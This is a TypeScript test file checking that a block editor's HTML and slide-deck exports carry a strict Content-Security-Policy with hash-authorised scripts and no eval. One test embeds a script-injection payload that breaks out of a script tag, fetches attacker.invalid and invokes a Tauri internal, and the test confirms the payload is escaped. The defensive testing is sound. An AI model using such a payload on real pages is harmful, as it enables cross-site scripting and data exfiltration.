import {describe, expect, it} from 'vitest';
import type {PageSnapshot} from '@book.dev/sdk';
import {createDoc, encodeSnapshot} from '../../blockeditor/model';
import {inlineScriptHash} from '../exportCsp';
import {toHtml, toSlideDeck} from '../toHtml';

const legacy = (blocks: Array<{id: string; type: string; data: Record<string, unknown>}>, values: Array<[string, unknown]> = []): PageSnapshot => ({
  editorjs: {blocks},
  values,
  names: [],
} as never);

const cspOf = (html: string): string => {
  const match = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  expect(match).not.toBeNull();
  return match![1];
};

const executableScripts = (html: string): string[] => {
  const parsed = new DOMParser().parseFromString(html, 'text/html');
  return [...parsed.querySelectorAll('script')]
    .filter((script) => script.type === '' || script.type === 'module' || script.type === 'text/javascript')
    .map((script) => script.textContent ?? '');
};

describe('standalone export page CSP', () => {
  it('uses correct deterministic SHA-256 source expressions', () => {
    expect(inlineScriptHash('')).toBe('\'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=\'');
    expect(inlineScriptHash('abc')).toBe('\'sha256-ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0=\'');
  });

  it('authorizes every emitted executable script by exact hash and no dynamic compilation', () => {
    const html = toSlideDeck(
      legacy(
        [
          {id: 'slider', type: 'slider', data: {name: 'n', min: 0, max: 10, initial: 3}},
          {id: 'formula', type: 'expr', data: {name: 'compound', source: '[__C__{slider}__, Math.pow(__C__{slider}__, 2)]'}},
          // The kind-less path inlines D3 + Plot. Its unused DSV helper must
          // also be compiler-free so a literal grep of the whole file passes.
          {id: 'chart', type: 'chart', data: {refCellIds: ['formula'], labels: 'n, n²'}},
        ],
        [['slider', 3], ['formula', [3, 9]]],
      ),
      'Safe deck',
      '',
    );
    const csp = cspOf(html);
    const scriptDirective = csp.match(/(?:^|; )script-src ([^;]+)/)?.[1] ?? '';
    const scripts = executableScripts(html);
    expect(scripts.length).toBeGreaterThan(0);
    for (const source of scripts) expect(csp).toContain(inlineScriptHash(source));
    expect(csp).toContain('connect-src \'none\'');
    expect(csp).toContain('script-src-attr \'none\'');
    expect(csp).not.toContain('unsafe-eval');
    expect(scriptDirective).not.toContain('unsafe-inline');
    expect(html).not.toMatch(/new Function|\beval\s*\(/);
  });

  it('escapes hostile reactive JSON so formula text cannot close its data block', () => {
    const attack = '</script><script>fetch("https://attacker.invalid");window.__TAURI_INTERNALS__.invoke("pwn")</script>';
    const html = toHtml(
      legacy(
        [
          {id: 'bad', type: 'expr', data: {name: 'bad', source: attack}},
          {id: 'shown', type: 'paragraph', data: {text: 'still inert'}},
        ],
        [['bad', 42]],
      ),
      'Hostile formula',
      '',
    );
    const data = html.match(/<script type="application\/json" id="ob-data">([\s\S]*?)<\/script>/)?.[1];
    expect(data).toBeTruthy();
    expect(data).toContain('<\\/script><script>fetch');
    expect(JSON.parse(data!).exprs[0].source).toBe(attack);
    // Only the hash-authorized runtime is executable; both copies of the raw
    // snapshot/expression are inside inert, closing-tag-escaped data scripts.
    expect(executableScripts(html)).toHaveLength(1);
    expect(cspOf(html)).not.toContain('unsafe-eval');
  });

  it('ships the hydrated viewer with the safe hook and no dynamic compiler calls', () => {
    const doc = createDoc([
      {id: 'slider', type: 'slider', props: {name: 'n', label: 'n', value: 3, min: 0, max: 10}},
      {id: 'formula', type: 'formula', props: {name: 'squared', source: 'Math.pow(n, 2)'}},
      {id: 'chart', type: 'kitchart', props: {kind: 'bar', source: '[n, squared]', labels: 'n, n²'}},
    ]);
    const html = toHtml(
      {editorjs: {blocks: []}, values: [], names: [], editor: 'blocks', blockdoc: encodeSnapshot(doc)} as never,
      'Hydrated safe viewer',
      '',
    );
    const csp = cspOf(html);
    expect(html).not.toContain('id="ob-data"');
    expect(html).toContain('__OB_SAFE_EXPRESSION__');
    expect(html).not.toMatch(/new Function|\bFunction\s*\(|\beval\s*\(/);
    for (const source of executableScripts(html)) expect(csp).toContain(inlineScriptHash(source));
    expect(csp).not.toContain('unsafe-eval');
  });
});
